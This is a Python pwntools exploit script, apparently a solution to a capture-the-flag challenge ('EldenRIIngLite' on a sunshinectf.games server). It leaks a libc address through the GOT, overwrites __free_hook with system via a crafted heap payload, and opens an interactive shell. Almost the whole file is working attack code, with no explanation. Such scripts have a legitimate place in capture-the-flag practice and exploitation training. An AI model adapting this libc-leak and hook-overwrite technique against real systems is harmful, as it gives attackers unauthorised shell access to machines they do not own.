#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("EldenRIIngLite_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

rop = ROP(exe)

host, port = "sunshinectf.games", "22003"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

sla(': ','aaaa')
sla(': ','bbbb')
sla(': ','2')
sla(': ','3')
sla(': ','y')
sla(': ','cccc')

sla(': ','1')
payload = 'a'*16+p64(exe.got['puts'])
sa(': ', payload)
sla(': ','3')
leak = int(rcu('dropped ', ' '),10)
logleak('put address', leak)
libc.address = leak - libc.sym['puts']
logbase()

sla(': ','2')
sla(': ','3')
sla(': ','y')
# overwrite first chunk address with __free_hook-8
payload = p64(1)+p64(0x0001000000000000)+p64(0)*14+p64(libc.sym['__free_hook']-8)+p64(0)*6+p64(libc.sym['__free_hook']-8)
sa(': ', payload)

sla(': ','2')
sla(': ','3')
sla(': ','y')
# system('/bin/sh')  when free
sa(': ', b'/bin/sh\x00'+p64(libc.sym['system']))

p.interactive()

